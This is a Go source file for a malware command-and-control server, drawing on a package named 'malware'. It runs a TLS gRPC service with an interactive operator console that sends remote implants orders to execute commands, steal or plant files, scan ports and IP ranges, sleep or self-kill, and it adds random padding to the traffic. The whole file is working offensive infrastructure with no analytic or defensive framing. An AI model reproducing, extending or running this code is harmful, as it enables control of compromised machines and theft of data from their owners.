package main

import (
	"context"
	"fmt"
	"github.com/chzyer/readline"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/grpc/peer"
	"io"
	"io/ioutil"
	"log"
	pb "malware/common/messages"
	"malware/common/types"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
)

type c2 struct {
	port  int
	queue chan *pb.CheckCmdReply
	term  *readline.Instance
}

func (c2 *c2) writeString(str string) {
	log.Print(str)
}

func (c2 *c2) handleReply(ip string, reply *pb.ImplantReply) {
	log.SetPrefix("\033[31m[\033[0m" + ip + "\033[31m]\033[0m ")
	if err := reply.GetError(); err != 0 {
		c2.writeString("\033[31mError: " + types.ErrorToString[err] + "\033[0m\n")
	} else {
		c2.writeString(strings.Replace(reply.String(), "\\n", "\n", -1) + "\n")
	}
}

func (c2 *c2) CheckCommandQueue(ctx context.Context, req *pb.CheckCmdRequest) (*pb.CheckCmdReply, error) {
	switch u := req.Message.(type) {
	case *pb.CheckCmdRequest_Heartbeat:
		select {
		case msg, ok := <-c2.queue:
			if ok {
				msg.RandomPadding = make([]byte, rand.Intn(100)+1)
				rand.Read(msg.RandomPadding)
				return msg, nil
			} else {
				panic("Queue closed")
			}
		default:
		}
	case *pb.CheckCmdRequest_Reply:
		var ip string
		if peer, ok := peer.FromContext(ctx); ok {
			ip = peer.Addr.String()
		} else {
			ip = "no ip"
		}
		c2.handleReply(ip, u.Reply)
	default:
		fmt.Println(req, u)
		panic("Didn't received a valid message")
	}
	msg := &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Heartbeat{Heartbeat: time.Now().Unix()}}
	msg.RandomPadding = make([]byte, rand.Intn(100)+1)
	rand.Read(msg.RandomPadding)

	return msg, nil
}

func (c2 *c2) help() {
	c2.writeString("Commands: (If module is enabled)")
	c2.writeString("\tlist                      -> List enabled modules")
	c2.writeString("\tportscan <ip> <from> <to> -> Scan ports")
	c2.writeString("\texec <cmd>                -> Exec command")
	c2.writeString("\tgetfile <filename>        -> Get file from server")
	c2.writeString("\tputfile <local> <remote>  -> Put file from server")
	c2.writeString("\tkill                      -> Kill the implant")
	c2.writeString("\tsleep <seconds>           -> Sleep the implant")
}

func (c2 *c2) handle(text string) {
	parts := strings.Split(strings.TrimSpace(text), " ")
	switch parts[0] {
	case "ipscan":
		if len(parts) != 2 {
			fmt.Println("Incorrect usage")
			c2.help()
			return
		}

		message := &pb.IPScan{IpRange: parts[1]}
		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_IpScan{IpScan: message}}

	case "portscan":
		if len(parts) != 4 {
			fmt.Println("Incorrect usage")
			c2.help()
			return
		}
		start, err := strconv.Atoi(parts[2])
		if err != nil {
			fmt.Println("Incorrect usage")
			c2.help()
			return
		}
		end, err := strconv.Atoi(parts[3])
		if err != nil {
			fmt.Println("Incorrect usage")
			c2.help()
			return
		}

		message := &pb.PortScan{Ip: parts[1], StartPort: uint32(start), EndPort: uint32(end)}
		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Portscan{Portscan: message}}
	case "exec":
		if len(parts) < 2 {
			fmt.Println("Incorrect usage")
			c2.help()
			return
		}
		message := &pb.Exec{Exec: parts[1], Args: parts[2:]}
		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Exec{Exec: message}}
	case "getfile":
		if len(parts) != 2 {
			fmt.Println("Incorrect usage")
			c2.help()
			return
		}
		message := &pb.GetFile{Filename: parts[1]}
		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Getfile{Getfile: message}}
	case "putfile":
		if len(parts) != 3 {
			fmt.Println("Incorrect usage")
			c2.help()
			return
		}
		out, err := ioutil.ReadFile(parts[1])
		if err != nil {
			fmt.Println("Can't find file: " + parts[1])
			return
		}
		message := &pb.UploadFile{Filename: parts[2], Contents: out}
		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Uploadfile{Uploadfile: message}}
	case "list":
		message := &pb.ListModules{}
		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Listmodules{Listmodules: message}}
	case "kill":
		log.Println("Killed implant")
		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Kill{Kill: 1}}
	case "sleep":
		if len(parts) != 2 {
			fmt.Println("Incorrect usage")
			c2.help()
			return
		}
		seconds, err := strconv.Atoi(parts[1])
		if err != nil {
			fmt.Println("Not a valid int: " + parts[1])
			return
		}

		log.Println("Implant sleeping...")
		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Sleep{Sleep: int64(seconds)}}
	case "help":
		c2.help()
	default:
		c2.writeString("Cmd not found: " + parts[0] + "\n")
	}
}

func (c2 *c2) ReadUserInput() {
	for {
		line, err := c2.term.Readline()
		if err == readline.ErrInterrupt {
			continue
		} else if err == io.EOF {
			break
		}

		c2.handle(line)

	}
}

func filterInput(r rune) (rune, bool) {
	switch r {
	// block CtrlZ feature
	case readline.CharCtrlZ:
		return r, false
	}
	return r, true
}

// Function constructor - constructs new function for listing given directory
func listfiles(line string) []string {
	names := make([]string, 0)

	filename := strings.TrimSpace(line)
	parts := strings.Split(filename, " ")
	var dir string
	if len(parts) == 1 {
		dir = "./"
	} else {
		filename = parts[1]
		last_index := strings.LastIndex(filename, "/")

		if last_index == -1 {
			last_index = len(filename) - 1
		}

		dir = filename[:last_index+1]
		filename = filename[last_index+1:]
	}

	files, _ := ioutil.ReadDir(dir)
	for _, f := range files {
		if (dir == "./" || strings.HasPrefix(f.Name(), filename)) && !strings.HasPrefix(f.Name(), ".") {
			names = append(names, dir+f.Name())
		}
	}
	return names
}

var completer = readline.NewPrefixCompleter(
	readline.PcItem("exec"),
	readline.PcItem("getfile"),
	readline.PcItem("putfile", readline.PcItemDynamic(listfiles)),
	readline.PcItem("portscan"),
	readline.PcItem("ipscan"),
	readline.PcItem("kill"),
	readline.PcItem("sleep"),
	readline.PcItem("help"),
)

func main() {
	if len(os.Args) != 3 {
		panic("Require Cert and Key as argument")
	}

	creds, err := credentials.NewServerTLSFromFile(os.Args[1], os.Args[2])

	if err != nil {
		panic(err)
	}

	log.SetFlags(log.Ltime)

	l, err := readline.NewEx(&readline.Config{
		Prompt:          "\033[34mc2%\033[0m ",
		HistoryFile:     "/tmp/readline.tmp",
		AutoComplete:    completer,
		InterruptPrompt: "^C",
		EOFPrompt:       "exit",

		HistorySearchFold:   true,
		FuncFilterInputRune: filterInput,
	})

	if err != nil {
		panic(err)
	}
	defer l.Close()
	log.SetOutput(l.Stderr())

	c2 := &c2{port: _C2_PORT_, queue: make(chan *pb.CheckCmdReply, 100), term: l}
	host := fmt.Sprintf(":%d", c2.port)
	listener, err := net.Listen("tcp", host)

	if err != nil {
		panic(err)
	}

	defer listener.Close()

	server := grpc.NewServer(grpc.Creds(creds))

	pb.RegisterMalwareServer(server, c2)

	go func() {
		c2.ReadUserInput()
		server.Stop()

	}()
	server.Serve(listener)
	fmt.Println("Exiting")
}
